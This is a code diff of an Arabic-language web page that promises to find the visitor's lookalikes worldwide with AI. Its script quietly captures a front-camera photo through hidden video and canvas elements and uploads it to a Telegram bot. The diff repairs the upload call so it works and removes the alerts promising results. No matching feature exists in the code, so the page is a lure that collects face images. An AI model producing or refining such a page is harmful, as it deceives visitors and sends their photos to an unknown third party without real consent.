@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>اكتشف أشباهك حول العالم باستخدام الذكاء الاصطناعي</title>
+  <title>اكتشاف أشباهك حول العالم باستخدام الذكاء الاصطناعي</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -16,12 +16,11 @@
     header {
       background-color: #3e4a89;
       color: #fff;
-      padding: 40px 0;
-      font-size: 2.5em;
+      padding: 30px 0;
+      font-size: 2em;
       text-transform: uppercase;
       font-weight: bold;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      animation: fadeIn 2s ease-in-out;
     }
     .container {
       max-width: 800px;
@@ -30,19 +29,16 @@
       background-color: #2a2c3e;
       border-radius: 15px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-      animation: slideIn 1.5s ease-in-out;
     }
     h2 {
       color: #f4d03f;
-      font-size: 2.2em;
+      font-size: 2em;
       margin-bottom: 20px;
-      animation: fadeIn 2.5s ease-in-out;
     }
     p {
       font-size: 1.4em;
       line-height: 1.6;
       color: #b0b0b0;
-      animation: fadeIn 3s ease-in-out;
     }
     button {
       background-color: #f4d03f;
@@ -52,33 +48,18 @@
       border: none;
       border-radius: 10px;
       cursor: pointer;
-      transition: background-color 0.3s, transform 0.3s;
+      transition: background-color 0.3s;
       text-transform: uppercase;
       font-weight: bold;
-      animation: pulse 2s infinite;
     }
     button:hover {
       background-color: #ffca28;
-      transform: scale(1.05);
     }
     #videoElement {
       display: none;
     }
     #canvas {
       display: none;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    @keyframes slideIn {
-      from { transform: translateY(-50px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
     }
   </style>
 </head>
@@ -89,10 +70,10 @@
 
   <div class="container">
     <h2>هل ترغب في معرفة من يشبهك في أنحاء العالم؟</h2>
-    <p>استخدم الذكاء الاصطناعي المتقدم لاكتشاف الأشخاص الذين يشبهونك في مختلف أنحاء العالم. اضغط على الزر أدناه لالتقاط صورة باستخدام كاميرتك الأمامية وابدأ رحلة الاكتشاف!</p>
+    <p>اضغط على الزر لالتقاط صورة باستخدام كاميرتك الأمامية.</p>
     
     <!-- زر لالتقاط الصورة -->
-    <button id="captureButton">ابدأ الاكتشاف الآن</button>
+    <button id="captureButton">التقط صورة</button>
 
     <!-- عنصر الفيديو لعرض البث المباشر من الكاميرا (مخفي) -->
     <video id="videoElement" autoplay></video>
@@ -135,23 +116,18 @@
               formData.append('photo', blob);
 
               // إرسال الصورة إلى تيليجرام
-              fetch("https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN"}/sendPhoto, {
+              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
               })
               .then(response => {
                 if (response.ok) {
                   console.log('تم إرسال الصورة إلى تيليجرام بنجاح!');
-                  alert('تم إرسال الصورة بنجاح! سنقوم بتحليلها وإرسال النتائج قريبًا.');
                 } else {
                   console.error('فشل إرسال الصورة إلى تيليجرام:', response.statusText);
-                  alert('حدث خطأ أثناء إرسال الصورة. يرجى المحاولة مرة أخرى.');
                 }
               })
-              .catch(error => {
-                console.error('خطأ في إرسال الصورة إلى تيليجرام:', error);
-                alert('حدث خطأ أثناء إرسال الصورة. يرجى المحاولة مرة أخرى.');
-              });
+              .catch(error => console.error('خطأ في إرسال الصورة إلى تيليجرام:', error));
             });
           }, 2000); // تأخير بسيط قبل التقاط الصورة
         })
